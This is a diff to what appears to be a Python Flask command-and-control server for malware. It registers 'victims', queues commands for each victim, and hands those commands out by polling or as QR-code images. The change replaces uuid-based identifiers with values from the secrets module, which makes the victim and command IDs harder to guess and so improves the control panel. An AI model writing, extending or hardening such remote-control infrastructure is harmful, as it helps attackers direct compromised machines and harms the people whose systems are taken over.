@@ -8,7 +8,7 @@ import base64
 import io
 import json
 import time
-import uuid
+import secrets
 import threading
 import zipfile
 import os
@@ -106,7 +106,7 @@ def index():
 @app.route("/register", methods=["POST"])
 def register_victim():
     data = request.get_json() or {}
-    victim_id = str(uuid.uuid4())[:8]
+    victim_id = secrets.token_hex(8)
     with victims_lock:
         victims[victim_id] = {
             "id": victim_id,
@@ -140,7 +140,7 @@ def get_qr_command(victim_id):
         if victim["command_queue"]:
             cmd = victim["command_queue"].pop(0)
         else:
-            cmd = {"cmd": "heartbeat", "ts": time.time(), "id": str(uuid.uuid4())[:6]}
+            cmd = {"cmd": "heartbeat", "ts": time.time(), "id": secrets.token_hex(4)}
     buf = encode_command_to_qr(cmd)
     return send_file(buf, mimetype="image/png")
 
@@ -156,7 +156,7 @@ def queue_command(victim_id):
     if custom_args:
         cmd["args"] = custom_args
     cmd["ts"] = time.time()
-    cmd["id"] = str(uuid.uuid4())[:6]
+    cmd["id"] = secrets.token_hex(4)
     with victims_lock:
         if victim_id not in victims:
             return jsonify({"error": "Victim not found"}), 404
@@ -269,7 +269,7 @@ def poll_command(victim_id):
             cmd = victim["command_queue"].pop(0)
             return jsonify(cmd)
         else:
-            return jsonify({"cmd": "heartbeat", "ts": time.time(), "id": str(uuid.uuid4())[:6]})
+            return jsonify({"cmd": "heartbeat", "ts": time.time(), "id": secrets.token_hex(4)})
 
 @app.route("/check")
 def health_check():
